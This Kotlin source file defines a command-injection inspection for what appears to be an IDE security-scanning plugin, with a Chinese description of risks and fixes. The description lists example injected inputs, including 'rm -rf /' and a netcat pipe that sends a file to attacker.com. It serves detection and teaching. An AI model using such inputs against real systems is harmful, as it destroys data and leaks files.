package com.scan.securityscan.inspections

import com.scan.securityscan.rules.SecurityRule
import com.scan.securityscan.rules.impl.CommandInjectionRule

/**
 * 命令注入风险检查
 */
class CommandInjectionInspection : SecurityInspectionBase() {
    
    override fun getSecurityRules(): List<SecurityRule> {
        return listOf(CommandInjectionRule())
    }
    
    override fun getDisplayName(): String {
        return "命令注入漏洞检测（高危）"
    }
    
    override fun getShortName(): String {
        return "CommandInjection"
    }
    
    override fun getStaticDescription(): String {
        return """
            检测可能导致命令注入攻击的不安全代码。
            
            当应用程序执行包含外部输入的系统命令时，攻击者可以通过特殊字符（如 ; | & 等）
            注入额外的命令，从而获取系统控制权。
            
            【检测范围】
            - Runtime.getRuntime().exec()
            - ProcessBuilder 使用字符串拼接
            - 执行 shell 命令（sh -c、cmd /c）
            
            【常见攻击示例】
            
            1. 分号注入
               用户输入：file.txt; rm -rf /
               执行命令：cat file.txt; rm -rf /
               
            2. 管道注入
               用户输入：file.txt | nc attacker.com 1234
               执行命令：cat file.txt | nc attacker.com 1234
               
            3. 反引号注入
               用户输入：file.txt`whoami`
               执行命令：cat file.txt`whoami`
            
            【为什么参数数组更安全】
            使用字符串形式的 exec() 会调用系统 shell 解析命令，
            而参数数组形式直接传递给目标程序，避免了 shell 解析。
            
            【国内审计要求】
            - 奇安信代码审计：高危漏洞，必须修复
            - 等保2.0测评：命令注入是必查项
            - OWASP Top 10: A03:2021 – Injection
            
            【修复优先级】
            🔥 最高优先级 - 必须立即修复
            
            【最佳实践】
            1. 优先使用 Java API 替代系统命令
            2. 必须执行时使用参数数组形式
            3. 对输入进行严格的白名单校验
            4. 最小化应用程序权限
        """.trimIndent()
    }
}

